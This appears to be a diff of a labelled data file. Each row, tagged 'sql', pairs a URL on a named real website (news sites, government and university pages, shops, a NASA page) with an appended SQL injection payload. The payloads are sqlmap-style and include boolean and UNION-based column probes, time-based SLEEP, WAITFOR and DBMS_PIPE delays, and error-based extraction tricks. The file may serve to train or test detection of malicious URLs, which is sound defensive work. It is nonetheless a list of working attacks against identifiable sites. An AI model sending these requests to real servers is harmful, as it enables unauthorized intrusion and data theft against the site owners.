+670,sql,https://www.i-cpan.es/detallePregunta.php?id=1') AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))) AND ('eWKx'='eWKx
+671,sql,http://www.tomkane.com/section.php?id=1 AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)))-- sFCM
+672,sql,http://www.belmos.ru/transp-artcl.php?id=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+673,sql,https://74.ru/forum/view.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bNBY
+674,sql,http://www.lecoshop.ru/dir.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- mqyP
+675,sql,http://www.jevicko.cz/index.php?id=1') AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND ('JGjZ'='JGjZ
+676,sql,http://www.vlktravel.com/tour.php?id=1' AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND 'MGRK'='MGRK
+677,sql,http://www.anm-conso.com/prof-03.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BMLy
+678,sql,https://www.filter.ru/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ApsM
+679,sql,http://ohiofoodbanks.org/programs/programs.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- WGMa
+681,sql,http://2017.tiff-jp.net/ja/lineup/works.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+682,sql,http://www.sriaurobindoashram.org/music/sunil/index.php?id=1%' AND SLEEP(5) AND '%'='
+683,sql,http://eurofo.ru/m/viewforum.php?id=1') UNION ALL SELECT NULL,NULL,NULL-- SOSW
+685,sql,http://animatch.ca/machform/view.php?id=1) ORDER BY 1-- zRhc
+686,sql,http://www.sydneyshoot.com/buy.php?id=1' AND 3611=3611 AND 'oygD'='oygD
+687,sql,http://www.theartofdicktwinney.com/statment.php?id=(SELECT (CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)))
+688,sql,https://place.fi.ncsu.edu/local/catalog/section.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+689,sql,http://www2.ntnu.edu.tw/modules/tinyd0/index.php?id=(SELECT (CASE WHEN (3684=3684) THEN 3684 ELSE 3684*(SELECT 3684 FROM INFORMATION_SCHEMA.PLUGINS) END))
+690,sql,http://www.hits.pt/gca/index.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))-- Qmvu
+691,sql,http://www.warbears.com/missions.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- GgCj
+692,sql,https://www.hcilondon.in/pages.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- vGXN
+693,sql,http://www.firstreception.gov.gr/content.php?id=1') WAITFOR DELAY '0:0:5' AND ('RIHg'='RIHg
+694,sql,http://www.opera-amsterdam.nl/pages.php?id=1') AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND ('JGjZ'='JGjZ
+698,sql,http://www.ubraintv.com/watchchannel.php?id=1 AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)))
+699,sql,https://www.skau.sk/page.php?id=1') UNION ALL SELECT NULL-- eEGL
+700,sql,https://www.tukui.org/addons.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IKMj
+701,sql,http://www.semsk.kz/newscat.php?id=1) AND SLEEP(5) AND (7824=7824
+702,sql,http://www.msosocal.com/subpages/leadership_bio.php?id=1 UNION ALL SELECT NULL-- uRNf
+703,sql,http://pravo.ua/events.php?id=1")))(,,)')
+704,sql,http://www.rainbow.com.my/support.php?id=1) AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND (4586=4586
+705,sql,https://www.softube.com/index.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+706,sql,http://www.chicken.org.au/page.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- pgqv
+708,sql,http://www.oardc.ohio-state.edu/weedguide/single_weed.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)-- jIbI
+710,sql,http://bagfa.de/index.php?id=1%' WAITFOR DELAY '0:0:5' AND '%'='
+711,sql,https://likumi.lv/doc.php?id=1') WAITFOR DELAY '0:0:5' AND ('RIHg'='RIHg
+712,sql,https://earthobservatory.nasa.gov/IOTD/view.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)-- jIbI
+717,sql,https://www.otzyv.ru/read.php?id=1' AND 3611=3611 AND 'oygD'='oygD
+725,sql,http://dailyjinnah.com/epaper/page.php?id=1') AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND ('VgiB'='VgiB
+726,sql,http://dailyjinnah.com/epaper/page.php?id=1 AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)-- bfCW
+727,sql,http://dailyjinnah.com/epaper/page.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- Dvxx
+734,sql,https://antizapret.info/org.php?id=1 AND 3050=5102
